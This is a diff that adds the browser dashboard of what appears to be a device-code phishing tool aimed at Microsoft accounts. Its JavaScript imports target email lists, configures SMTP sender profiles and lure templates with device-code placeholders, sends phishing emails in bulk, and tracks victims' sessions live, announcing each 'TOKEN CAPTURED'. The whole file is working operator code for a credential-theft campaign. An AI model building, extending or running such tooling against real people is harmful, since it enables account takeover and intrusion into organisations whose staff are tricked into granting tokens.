+  body.innerHTML = targets.map(t => `
+    <tr>
+      <td style="color:var(--accent)">${t.email}</td>
+      <td>${t.display_name || '—'}</td>
+      <td>${t.department || '—'}</td>
+      <td>${t.region || '—'}</td>
+      <td>${t.group || '—'}</td>
+    </tr>
+  `).join('');
+}
+
+// ─── Phishing email dispatch ──────────────────────────────────────────────────
+async function sendPhishingEmails() {
+  if (!activeCampaignID) { notify('Select a campaign first', true); return; }
+  const profileID = document.getElementById('selectedProfile').value;
+  const templateID = document.getElementById('selectedTemplate').value;
+  if (!profileID) { notify('Select a sender profile first', true); return; }
+  if (!templateID) { notify('Select an email template first', true); return; }
+
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/send-emails', {
+    profile_id: profileID,
+    template_id: templateID
+  });
+  if (result.error) { notify(result.error, true); return; }
+
+  const results = result.results || [];
+  const ok = results.filter(r => r.success).length;
+  const fail = results.length - ok;
+  notify('Emails sent: ' + ok + ' ok, ' + fail + ' failed');
+  loadEmailResults();
+}
+
+async function loadEmailResults() {
+  if (!activeCampaignID) return;
+  const results = await api('GET', '/campaigns/' + activeCampaignID + '/email-results');
+  const body = document.getElementById('emailResultsBody');
+  if (!Array.isArray(results) || results.length === 0) {
+    body.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:32px;color:var(--text-dim)">No emails sent yet</td></tr>';
+    return;
+  }
+  body.innerHTML = results.map(r => `
+    <tr>
+      <td style="color:var(--text-bright)">${r.target_email}</td>
+      <td>${r.success ? '<span class="badge badge-ok">✓ sent</span>' : '<span class="badge badge-fail">✕ failed</span>'}</td>
+      <td style="color:var(--text-dim);font-size:11px">${formatTime(r.sent_at)}</td>
+      <td style="color:var(--accent2);font-size:11px">${r.error || '—'}</td>
+    </tr>
+  `).join('');
+}
+
+async function exportCampaign() {
+  if (!activeCampaignID) { notify('Select a campaign first', true); return; }
+  // Trigger file download directly via browser navigation
+  const a = document.createElement('a');
+  a.href = '/api/campaigns/' + activeCampaignID + '/export';
+  a.download = 'campaign_' + activeCampaignID + '_export.json';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  notify('Export started');
+}
+
+async function confirmDeleteCampaign() {
+  if (!activeCampaignID) { notify('Select a campaign first', true); return; }
+  const name = document.getElementById('campaignTitle')?.textContent || activeCampaignID;
+  if (!confirm('DELETE campaign "' + name + '" and ALL its data?\n\nThis cannot be undone.')) return;
+  const result = await api('DELETE', '/campaigns/' + activeCampaignID);
+  if (result.error) { notify(result.error, true); return; }
+  notify('Campaign deleted');
+  activeCampaignID = null;
+  if (eventSource) { eventSource.close(); eventSource = null; }
+  document.getElementById('campaignView').style.display = 'none';
+  document.getElementById('emptyState').style.display = '';
+  loadCampaigns();
+}
+
+// ─── SSE ─────────────────────────────────────────────────────────────────────
+function startEventStream() {
+  if (eventSource) eventSource.close();
+  eventSource = new EventSource('/api/campaigns/' + activeCampaignID + '/events');
+  eventSource.onmessage = (e) => {
+    try { updateDashboard(JSON.parse(e.data)); } catch(err) {}
+  };
+  eventSource.onerror = () => {
+    document.getElementById('connectionDot').style.background = 'var(--accent2)';
+    document.getElementById('connectionStatus').textContent = 'RECONNECTING';
+  };
+  eventSource.onopen = () => {
+    document.getElementById('connectionDot').style.background = 'var(--accent3)';
+    document.getElementById('connectionStatus').textContent = 'LIVE';
+  };
+}
+
+function updateDashboard(data) {
+  const sessions = data.sessions || {};
+  const sessArr = Object.values(sessions);
+  let pending = 0, captured = 0, expired = 0;
+  sessArr.forEach(s => {
+    if (s.state_str === 'pending') pending++;
+    else if (s.state_str === 'completed') captured++;
+    else if (s.state_str === 'expired') expired++;
+  });
+  document.getElementById('statActive').textContent = sessArr.length;
+  document.getElementById('statPending').textContent = pending;
+  document.getElementById('statCaptured').textContent = captured;
+  document.getElementById('statExpired').textContent = expired;
+  renderSessions(sessArr);
+  renderNewTokens(sessArr.filter(s => s.state_str === 'completed'));
+}
+
+function renderSessions(sessions) {
+  const body = document.getElementById('sessionsBody');
+  if (!sessions.length) {
+    body.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:32px;color:var(--text-dim)">No active sessions — launch campaign to start</td></tr>';
+    return;
+  }
+  sessions.sort((a, b) => {
+    const order = {completed:0, pending:1, expired:2, error:3, cancelled:4, initializing:5};
+    return (order[a.state_str]||9) - (order[b.state_str]||9);
+  });
+  body.innerHTML = sessions.map(s => {
+    const expiry = s.expires_at ? timeUntil(s.expires_at) : '—';
+    const codeClass = s.state_str === 'completed' ? 'user-code redeemed' : 'user-code';
+    return `
+      <tr>
+        <td style="color:var(--text-bright)">${s.target_email}</td>
+        <td><span class="${codeClass}">${s.user_code || '—'}</span></td>
+        <td>${badgeHTML(s.state_str)}</td>
+        <td style="color:var(--text-dim)">${s.poll_count || 0}</td>
+        <td style="color:${s.state_str==='expired'?'var(--accent2)':'var(--text-dim)'}">${expiry}</td>
+        <td style="color:var(--accent3)">${s.upn || '—'}</td>
+      </tr>
+    `;
+  }).join('');
+}
+
+function renderNewTokens(completed) {
+  const log = document.getElementById('tokenLog');
+  completed.forEach(s => {
+    if (tokensSeen.has(s.target_id)) return;
+    tokensSeen.add(s.target_id);
+    const identity = s.upn || s.target_email;
+    const entry = document.createElement('div');
+    entry.className = 'log-entry success';
+    entry.innerHTML = `
+      <span class="log-time">${formatTime(s.redeemed_at)}</span>
+      <span class="log-email">${s.target_email}</span>
+      <span style="color:var(--text-dim)">→</span>
+      <span class="log-upn">${identity}</span>
+      <span style="color:var(--text-dim);margin-left:auto">${s.user_code}</span>
+    `;
+    if (log.querySelector('div[style*="Waiting"]')) log.innerHTML = '';
+    log.insertBefore(entry, log.firstChild);
+    notify('TOKEN CAPTURED: ' + identity);
+  });
+}
+
+async function loadTokenLog() {
+  if (!activeCampaignID) return;
+  const tokens = await api('GET', '/campaigns/' + activeCampaignID + '/tokens');
+  if (!Array.isArray(tokens) || tokens.length === 0) return;
+  const log = document.getElementById('tokenLog');
+  if (log.querySelector('div[style*="Waiting"]')) log.innerHTML = '';
+  tokens.forEach(t => {
+    if (tokensSeen.has(t.target_id)) return;
+    tokensSeen.add(t.target_id);
+    const identity = t.upn || t.target_email;
+    const entry = document.createElement('div');
+    entry.className = 'log-entry success';
+    entry.innerHTML = `
+      <span class="log-time">${formatTime(t.redeemed_at)}</span>
+      <span class="log-email">${t.target_email}</span>
+      <span style="color:var(--text-dim)">→</span>
+      <span class="log-upn">${identity}</span>
+      <span style="color:var(--text-dim);margin-left:auto;font-size:10px;color:var(--text-dim)">${t.scope ? t.scope.split(' ')[0] : ''}</span>
+    `;
+    log.insertBefore(entry, log.firstChild);
+  });
+}
+
+// ─── Sender profiles ─────────────────────────────────────────────────────────
+function newProfileForm() {
+  editingProfileID = null;
+  document.getElementById('profName').value = '';
+  document.getElementById('profHost').value = '';
+  document.getElementById('profPort').value = '587';
+  document.getElementById('profUser').value = '';
+  document.getElementById('profPass').value = '';
+  document.getElementById('profFromName').value = '';
+  document.getElementById('profFromAddr').value = '';
+  document.getElementById('profImplicitTLS').checked = false;
+}
+
+async function loadProfiles() {
+  const profiles = await api('GET', '/mailer/profiles');
+  const sel = document.getElementById('selectedProfile');
+  const list = document.getElementById('profileList');
+  const prev = sel.value;
+
+  // Update sidebar dropdown
+  while (sel.options.length > 1) sel.remove(1);
+  if (Array.isArray(profiles)) {
+    profiles.forEach(p => {
+      const opt = document.createElement('option');
+      opt.value = p.id;
+      opt.textContent = p.name;
+      sel.appendChild(opt);
+    });
+    if (prev) sel.value = prev;
+  }
+
+  // Update config list
+  if (!Array.isArray(profiles) || profiles.length === 0) {
+    list.innerHTML = '<div style="color:var(--text-dim);font-size:11px">No profiles yet</div>';
+    return;
+  }
+  list.innerHTML = profiles.map(p => `
+    <div class="item-row" onclick="editProfile('${p.id}')">
+      <div>
+        <div class="item-row-name">${p.name}</div>
+        <div class="item-row-sub">${p.from_address} via ${p.host}:${p.port}</div>
+      </div>
+      <div class="item-row-actions">
+        <button class="btn btn-sm btn-danger" onclick="event.stopPropagation();deleteProfile('${p.id}')">✕</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function editProfile(id) {
+  api('GET', '/mailer/profiles').then(profiles => {
+    const p = profiles.find(x => x.id === id);
+    if (!p) return;
+    editingProfileID = id;
+    document.getElementById('profName').value = p.name || '';
+    document.getElementById('profHost').value = p.host || '';
+    document.getElementById('profPort').value = p.port || 587;
+    document.getElementById('profUser').value = p.username || '';
+    document.getElementById('profPass').value = '';
+    document.getElementById('profFromName').value = p.from_name || '';
+    document.getElementById('profFromAddr').value = p.from_address || '';
+    document.getElementById('profImplicitTLS').checked = p.implicit_tls || false;
+  });
+}
+
+async function saveProfile() {
+  const body = {
+    name: document.getElementById('profName').value.trim(),
+    host: document.getElementById('profHost').value.trim(),
+    port: parseInt(document.getElementById('profPort').value) || 587,
+    username: document.getElementById('profUser').value.trim(),
+    password: document.getElementById('profPass').value,
+    from_name: document.getElementById('profFromName').value.trim(),
+    from_address: document.getElementById('profFromAddr').value.trim(),
+    implicit_tls: document.getElementById('profImplicitTLS').checked,
+  };
+  if (!body.name || !body.host || !body.from_address) {
+    notify('Name, host, and from address required', true);
+    return;
+  }
+  const result = await api('POST', '/mailer/profiles', body);
+  if (result.error) { notify(result.error, true); return; }
+  notify('Sender profile saved');
+  newProfileForm();
+  loadProfiles();
+}
+
+async function deleteProfile(id) {
+  await api('DELETE', '/mailer/profiles/' + id);
+  notify('Profile deleted');
+  loadProfiles();
+}
+
+async function testProfile() {
+  const profID = editingProfileID;
+  if (!profID) {
+    notify('Save the profile first, then test it', true);
+    return;
+  }
+  const to = prompt('Send test email to:');
+  if (!to) return;
+  const result = await api('POST', '/mailer/profiles/' + profID + '/test', { to });
+  if (result.error) { notify('Test failed: ' + result.error, true); return; }
+  notify('Test email sent to ' + to);
+}
+
+// ─── Email templates ──────────────────────────────────────────────────────────
+function newTemplateForm() {
+  editingTemplateID = null;
+  document.getElementById('tmplName').value = '';
+  document.getElementById('tmplSubject').value = '';
+  document.getElementById('tmplRedirector').value = '';
+  document.getElementById('tmplHTML').value = '';
+  document.getElementById('tmplText').value = '';
+}
+
+async function loadTemplates() {
+  const templates = await api('GET', '/mailer/templates');
+  const sel = document.getElementById('selectedTemplate');
+  const list = document.getElementById('templateList');
+  const prev = sel.value;
+
+  while (sel.options.length > 1) sel.remove(1);
+  if (Array.isArray(templates)) {
+    templates.forEach(t => {
+      const opt = document.createElement('option');
+      opt.value = t.id;
+      opt.textContent = t.name;
+      sel.appendChild(opt);
+    });
+    if (prev) sel.value = prev;
+  }
+
+  if (!Array.isArray(templates) || templates.length === 0) {
+    list.innerHTML = '<div style="color:var(--text-dim);font-size:11px">No templates yet</div>';
+    return;
+  }
+  list.innerHTML = templates.map(t => `
+    <div class="item-row" onclick="editTemplate('${t.id}')">
+      <div>
+        <div class="item-row-name">${t.name}</div>
+        <div class="item-row-sub">${t.subject}</div>
+      </div>
+      <div class="item-row-actions">
+        <button class="btn btn-sm btn-danger" onclick="event.stopPropagation();deleteTemplate('${t.id}')">✕</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function editTemplate(id) {
+  api('GET', '/mailer/templates').then(templates => {
+    const t = templates.find(x => x.id === id);
+    if (!t) return;
+    editingTemplateID = id;
+    document.getElementById('tmplName').value = t.name || '';
+    document.getElementById('tmplSubject').value = t.subject || '';
+    document.getElementById('tmplRedirector').value = t.redirector_url || '';
+    document.getElementById('tmplHTML').value = t.html_body || '';
+    document.getElementById('tmplText').value = t.text_body || '';
+  });
+}
+
+async function saveTemplate() {
+  const body = {
+    name: document.getElementById('tmplName').value.trim(),
+    subject: document.getElementById('tmplSubject').value.trim(),
+    redirector_url: document.getElementById('tmplRedirector').value.trim(),
+    html_body: document.getElementById('tmplHTML').value,
+    text_body: document.getElementById('tmplText').value,
+  };
+  if (!body.name || !body.subject || !body.html_body) {
+    notify('Name, subject, and HTML body required', true);
+    return;
+  }
+
+  let result;
+  if (editingTemplateID) {
+    result = await api('PUT', '/mailer/templates/' + editingTemplateID, body);
+  } else {
+    result = await api('POST', '/mailer/templates', body);
+  }
+  if (result.error) { notify(result.error, true); return; }
+  notify('Template saved');
+  editingTemplateID = result.id || editingTemplateID;
+  loadTemplates();
+}
+
+async function deleteTemplate(id) {
+  await api('DELETE', '/mailer/templates/' + id);
+  if (editingTemplateID === id) newTemplateForm();
+  notify('Template deleted');
+  loadTemplates();
+}
+
+function uploadHTMLTemplate(input) {
+  const file = input.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = (e) => {
+    document.getElementById('tmplHTML').value = e.target.result;
+    notify('HTML template loaded — fill in name and subject then save');
+  };
+  reader.readAsText(file);
+  input.value = '';
+}
+
+function insertVar(fieldId, text) {
+  const el = document.getElementById(fieldId);
+  const start = el.selectionStart;
+  const end = el.selectionEnd;
+  el.value = el.value.substring(0, start) + text + el.value.substring(end);
+  el.selectionStart = el.selectionEnd = start + text.length;
+  el.focus();
+}
+
+function previewTemplate() {
+  const html = document.getElementById('tmplHTML').value;
+  if (!html) { notify('No HTML body to preview', true); return; }
+  // Render with sample data
+  const preview = html
+    .replace(/\{\{DCODE\}\}/g, 'ABCD-EFGH')
+    .replace(/\{\{URL\}\}/g, 'https://microsoft.com/devicelogin')
+    .replace(/\{\{EMAIL\}\}/g, 'user@corp.com')
+    .replace(/\{\{NAME\}\}/g, 'John Smith');
+  const modal = document.getElementById('previewModal');
+  const frame = document.getElementById('previewFrame');
+  frame.srcdoc = preview;
+  modal.style.display = 'flex';
+}
+
+function closePreview() {
+  document.getElementById('previewModal').style.display = 'none';
+}
+
+// ─── Tab switching ────────────────────────────────────────────────────────────
+function switchTab(name, btn) {
+  document.querySelectorAll('#campaignView .tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('#campaignView .tab-content').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('tab-' + name).classList.add('active');
+  if (name === 'tokens') loadTokenLog();
+  if (name === 'emails') loadEmailResults();
+}
+
+function switchMailTab(name, btn) {
+  document.querySelectorAll('#mailConfigView .tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('#mailConfigView .tab-content').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('mailtab-' + name).classList.add('active');
+}
+
+// ─── Helpers ─────────────────────────────────────────────────────────────────
+function badgeHTML(state) {
+  const map = {
+    pending: ['badge-pending', '◌'],
+    completed: ['badge-completed', '✓'],
+    expired: ['badge-expired', '✕'],
+    error: ['badge-error', '!'],
+    initializing: ['badge-initializing', '…'],
+    cancelled: ['badge-cancelled', '—'],
+  };
+  const [cls, icon] = map[state] || ['badge-pending', '?'];
+  return `<span class="badge ${cls}">${icon} ${state}</span>`;
+}
+
+function timeUntil(isoDate) {
+  if (!isoDate) return '—';
+  const diff = new Date(isoDate) - new Date();
+  if (diff <= 0) return 'expired';
+  const m = Math.floor(diff / 60000);
+  const s = Math.floor((diff % 60000) / 1000);
+  return `${m}m ${s}s`;
+}
+
+function formatTime(isoDate) {
+  if (!isoDate) return '—';
+  return new Date(isoDate).toLocaleTimeString();
+}
+
+// ─── Boot ─────────────────────────────────────────────────────────────────────
+(async () => {
+  const camps = await api('GET', '/campaigns').catch(() => []);
+  if (Array.isArray(camps) && camps.length > 0) {
+    renderCampaignList(camps);
+  }
+  loadProfiles();
+  loadTemplates();
+})();
+
+// ─── Drag-drop CSV ────────────────────────────────────────────────────────────
+const uploadArea = document.getElementById('uploadArea');
+uploadArea.addEventListener('dragover', (e) => { e.preventDefault(); uploadArea.classList.add('drag-over'); });
+uploadArea.addEventListener('dragleave', () => uploadArea.classList.remove('drag-over'));
+uploadArea.addEventListener('drop', (e) => {
+  e.preventDefault();
+  uploadArea.classList.remove('drag-over');
+  const file = e.dataTransfer.files[0];
+  if (file) {
+    const input = document.getElementById('csvFile');
+    const dt = new DataTransfer();
+    dt.items.add(file);
+    input.files = dt.files;
+    importCSV(input);
+  }
+});
+</script>
+</body>
+</html>
